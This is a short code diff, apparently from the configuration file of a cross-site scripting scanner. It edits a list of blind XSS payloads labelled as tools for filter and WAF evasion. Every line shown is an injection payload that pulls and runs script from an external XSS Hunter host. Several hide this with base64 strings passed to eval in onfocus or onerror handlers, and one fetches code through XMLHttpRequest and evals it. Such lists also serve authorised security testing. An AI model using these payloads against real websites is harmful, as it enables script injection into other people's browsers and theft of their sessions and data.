@@ -4,7 +4,6 @@ globalVariables = {}  # it holds variables during runtime for collaboration acro
 defaultEditor = 'nano'
 blindPayload = (  # Payloads for filter & WAF evasion
     '"><script src=https://xsshunternihao.xss.ht></script>',
-    'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xsshunternihao.xss.ht\';document.body.appendChild(a)')',
     '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>',
     '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>',
     '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xsshunternihao.xss.ht");a.send();</script>',
